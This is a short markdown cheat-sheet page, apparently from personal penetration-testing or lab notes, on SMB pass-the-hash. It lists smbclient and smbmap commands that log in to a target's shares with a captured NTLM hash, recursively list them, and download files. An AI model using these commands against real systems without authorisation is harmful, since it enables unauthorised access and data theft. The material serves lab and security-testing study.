---
layout: default
title: smb
tags:
    - 139
    - 445
    - block
    - message
    - samba
    - server
    - smbclient
    - smbd
    - smbmap
---
# smb

### Pass-the-hash

List directories

`smbclient -U <user>%<hash> --pw-nt-hash -L 10.10.10.10`

`smbmap -u <user> -p '<NTLM hash>:<LM hash>' -H 10.10.10.10` _LM hash is legacy and can usually be anything_

- `--download <path>`: download file
- `-R`: recursively list files

Open specific directory

`smbclient -U <user>%<hash> --pw-nt-hash //10.10.10.10/<directory>`